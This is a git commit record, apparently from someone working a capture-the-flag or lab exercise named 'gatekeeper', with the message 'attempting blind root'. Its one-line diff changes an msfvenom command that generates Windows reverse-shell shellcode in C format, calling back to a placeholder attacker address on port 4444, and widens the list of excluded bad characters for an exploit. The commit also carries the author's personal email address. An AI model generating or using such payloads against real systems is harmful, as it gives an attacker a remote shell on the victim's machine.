433d632c34bb726f25b2f9e97fbb4ab90be69ac0
max <mc.demontbron@gmail.com>
2025-08-02 12:53:23 +0200

    attempting blind root

--- gatekeeper/msfvenom.cmd
+++ gatekeeper/msfvenom.cmd
@@ -1,1 +1,1 @@
-msfvenom -p windows/shell_reverse_tcp LHOST=$YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f c
+msfvenom -p windows/shell_reverse_tcp LHOST=$YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00\x01\x02\x03\x04\x05\x06\x0a" -f c
